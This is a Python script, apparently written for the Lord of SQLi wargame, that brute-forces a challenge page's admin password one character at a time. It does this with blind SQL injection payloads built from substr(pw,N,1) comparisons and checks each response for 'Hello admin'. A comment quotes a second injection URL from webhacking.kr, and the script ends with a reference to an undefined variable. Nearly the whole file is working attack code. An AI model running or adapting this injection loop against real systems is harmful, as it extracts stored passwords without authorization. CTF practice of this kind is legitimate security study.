import string
from requests import get

memori = 40
time = string.digits + string.ascii_letters + string.whitespace
cookies = dict(PHPSESSID="??")
URL = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
memoria = ''

for Attack in range(1, memori+1):
    for a in time:
        print(str(a)+" 대입갑니다잉~")
        ria = "?pw=' or id='admin' and substr(pw,"+str(Attack)+",1)='"+a+"' -- ;"
        drute = URL + ria
        print(drute)
        huha = get(drute,cookies=cookies)

        if huha.text.__contains__('Hello admin'):
            print(a + "발견")
            memoria += a
            break



print(memoria)

print(p)
#"http://webhacking.kr/challenge/bonus/bonus-1
# /index.php?no=2+and+ascii%28substr%28pw%2C1%2C1%29%29%3D97&id=&pw="
# substr(pw,1,1) = '1' -- ;